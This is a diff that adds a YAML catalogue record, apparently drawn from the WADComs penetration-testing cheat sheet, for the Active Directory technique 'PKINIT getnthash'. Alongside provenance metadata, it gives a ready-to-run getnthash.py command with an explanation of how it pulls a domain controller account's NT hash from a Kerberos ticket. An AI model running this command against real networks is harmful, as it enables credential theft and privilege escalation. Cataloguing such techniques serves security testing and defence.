@@ -1,0 +1,99 @@
+id: wadcoms/PKINIT-getnthash
+type: technique
+platform: active-directory
+name: PKINIT getnthash
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+- privilege-escalation
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- tgt
+commands:
+- template: KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773
+  comment: "PKINIT getnthash.py request a TGS for yourself using Kerberos U2U. This will include with\
+    \ the PAC which in turn contains the NT hash that you can decrypt with the AS-REP key that you got\
+    \ from your TGT request using gettgtpkinit.py from PKINIT. Use the TGT from gettgtpkinit.py in your\
+    \ KRB5CCNAME env variable.\n\nCommand Reference:\n\n  Domain: test.local\n\n  Host that you got the\
+    \ TGT from: DC01\n\n  TGT from gettgtpkinit.py: out.ccache\n\n  AS-REP key: 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773\n"
+references:
+- https://github.com/dirkjanm/PKINITtools
+- https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
+tags:
+- active-directory
+- wadcoms
+- kerberos
+source_data:
+  WADComs:
+    raw:
+      file: PKINIT-getnthash.md
+      document: "---\ndescription: |\n  PKINIT getnthash.py request a TGS for yourself using Kerberos\
+        \ U2U. This will include with the PAC which in turn contains the NT hash that you can decrypt\
+        \ with the AS-REP key that you got from your TGT request using gettgtpkinit.py from PKINIT. Use\
+        \ the TGT from gettgtpkinit.py in your KRB5CCNAME env variable.\n\n  Command Reference:\n\n  \
+        \  Domain: test.local\n\n    Host that you got the TGT from: DC01\n\n    TGT from gettgtpkinit.py:\
+        \ out.ccache\n\n    AS-REP key: 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773\n\
+        \ncommand: |\n  KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773\n\
+        items:\n  - TGT\nservices:\n  - Kerberos\nOS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\n\
+        \  - PrivEsc\nreferences:\n  - https://github.com/dirkjanm/PKINITtools\n  - https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/\n\
+        ---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: PrivEsc'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: PrivEsc'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:1bda88745d742105af8083cef8a1c82ae5c3f7af27491f1807c84d366485611d
